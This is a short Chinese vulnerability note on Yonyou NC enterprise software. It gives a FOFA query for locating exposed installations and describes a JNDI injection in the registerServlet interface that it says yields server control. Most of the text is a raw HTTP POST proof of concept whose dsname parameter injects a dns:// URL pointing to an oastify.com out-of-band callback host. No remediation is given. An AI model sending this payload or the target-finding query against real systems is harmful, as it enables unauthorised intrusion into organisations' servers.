**fofa**

```
body="Client/Uclient/UClient.dmg"
```

**一、漏洞简述**

用友NC以“全球化集团管控、行业化解决方案、全程化电子商务、平台化应用集成”的管理业务理念而设计，采用J2EE架构和先进开放的集团级开发平台UAP，形成了集团管控8大领域15大行业68个细分行业的解决方案，是中国大企业集团管理信息化应用系统的首选。其接口registerServlet存在JNDI注入漏洞，攻击者可通过该漏洞获取服务器权限。

**二、漏洞检测poc**

```yaml
POST /portal/registerServlet HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 68

type=1&dsname=dns://123.x86pza1kqky3lej36r5c0yk2wt2kqbe0.oastify.com
```

